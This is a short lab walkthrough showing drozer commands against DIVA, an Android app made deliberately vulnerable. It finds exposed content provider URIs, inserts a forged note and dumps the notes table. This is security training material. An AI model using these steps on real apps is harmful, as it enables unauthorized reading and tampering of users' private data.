# Help information detail about this command #

```help scanner.provider.finduri```
<br><br>
```help app.provider.insert```
<br><br><br>
* **Running scanner.provider.finduris for scanning availabe accessible content**
```
dz> run scanner.provider.finduris -a jakhar.aseem.diva
Scanning jakhar.aseem.diva...
Able to Query    content://jakhar.aseem.diva.provider.notesprovider/notes/
Unable to Query  content://jakhar.aseem.diva.provider.notesprovider
Unable to Query  content://jakhar.aseem.diva.provider.notesprovider/
Able to Query    content://jakhar.aseem.diva.provider.notesprovider/notes

Accessible content URIs:
  content://jakhar.aseem.diva.provider.notesprovider/notes/
  content://jakhar.aseem.diva.provider.notesprovider/notes
```  
* **Running app.provider.insert for inject some content into tables**
```
dz> run app.provider.insert content://jakhar.aseem.diva.provider.notesprovider/notes/ --string title RootBakar --string note "Hi this is RootBakar Pawn Here" --integer _id 7
Done.
```
* **Running app.provider.query for view all tables field**
```
dz> run app.provider.query content://jakhar.aseem.diva.provider.notesprovider/notes/
| _id | title     | note                                 |
| 5   | Exercise  | Alternate days running               |
| 4   | Expense   | Spent too much on home theater       |
| 7   | RootBakar | Hi this is RootBakar Pawn Here       |
| 6   | Weekend   | b333333333333r                       |
| 3   | holiday   | Either Goa or Amsterdam              |
| 2   | home      | Buy toys for baby, Order dinner      |
| 1   | office    | 10 Meetings. 5 Calls. Lunch with CEO |
```
